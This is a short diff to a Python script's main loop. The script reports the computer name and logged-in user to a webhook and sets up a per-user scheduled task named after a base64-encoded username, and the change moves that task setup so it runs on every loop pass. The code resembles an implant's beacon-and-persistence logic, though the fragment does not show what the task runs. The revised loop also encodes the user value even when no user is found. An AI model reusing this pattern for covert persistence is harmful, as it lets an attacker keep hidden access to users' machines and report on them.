@@ -166,8 +166,8 @@ if __name__ == "__main__":
     s = False
     alive_data = format_alive_data(computer_name,user_name)
     while True:
+        user = get_logged_in_user()
         if not s:
-            user = get_logged_in_user()
             if user:
                 try:
                     texist = task_exists("MyApp_UserAgent")
@@ -176,10 +176,6 @@ if __name__ == "__main__":
                     msg = "error on check taskexist"
                 send_webhook(msg)
                 
-                buser = base64.b64encode(user.encode()).decode()
-                tname = f"MyApp_UserAgent{buser}"
-                if not task_exists(tname):
-                    create_user_task(user, tname)
                 msg = (
                     f"{computer_name} {user_name} {user}"
                 )
@@ -187,6 +183,11 @@ if __name__ == "__main__":
                 sent = send_webhook(msg)
                 if sent:               
                     s = True
+
+        buser = base64.b64encode(user.encode()).decode()
+        tname = f"MyApp_UserAgent{buser}"
+        if not task_exists(tname):
+            create_user_task(user, tname)
         
         if first_message:
             msg = (
